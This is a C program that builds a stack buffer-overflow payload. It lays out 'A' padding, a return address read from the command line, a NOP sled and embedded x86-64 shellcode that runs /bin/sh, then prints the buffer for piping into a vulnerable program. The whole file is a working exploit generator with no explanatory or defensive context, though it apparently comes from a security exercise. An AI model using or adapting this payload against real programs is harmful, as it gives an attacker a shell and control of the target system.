#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90

unsigned char shellcode[] =
  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
  "\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05";

// esse código tem o propósito de criar um buffer com um código malicioso no final, e com nops no começo
int main(int argc, char** argv)
{
    int nop_padding = 64;
    int code_size = 21;   
    int padding = 21;
    int eip_size = 8;  

    int total_size = padding + eip_size + nop_padding + code_size;
    unsigned char* code = shellcode;
    unsigned char buff[total_size];

    for(int i = 0; i < padding; i++)
        buff[i] = 'A';

    unsigned long long addr = strtoull(argv[1], NULL, 16);

    for(int i = 0; i < eip_size; i++)
    {
        buff[padding + i] = addr & 0xff;
        addr = addr >> 8;
    }

    for(int i = 0; i < nop_padding; i++)
        buff[padding + eip_size + i] = NOP;

    for(int i = 0; i < code_size; i++)
        buff[padding + eip_size + nop_padding + i] = code[i];

    for(int i = 0; i < total_size; i++)
        printf("%c", buff[i]);

    printf("\0");

    return 0;
}